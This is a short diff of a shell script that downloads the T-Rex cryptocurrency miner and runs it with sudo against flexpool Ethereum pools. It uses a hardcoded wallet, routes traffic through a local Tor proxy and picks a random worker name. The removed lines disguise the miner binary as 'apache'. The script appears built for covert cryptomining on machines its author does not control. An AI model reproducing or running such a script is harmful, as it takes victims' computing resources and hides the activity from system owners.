@@ -15,6 +15,5 @@ cd ..
 
 wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
 tar -xf t-rex-0.25.15-linux.tar.gz
-mv t-rex apache
-
-screen sudo ./apache -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x --proxy 127.0.0.1:9050 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --gpu-report-interval 5 --mt 1
+chmod +x t-rex
+sudo ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x --proxy 127.0.0.1:9050 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --gpu-report-interval 5 --mt 1
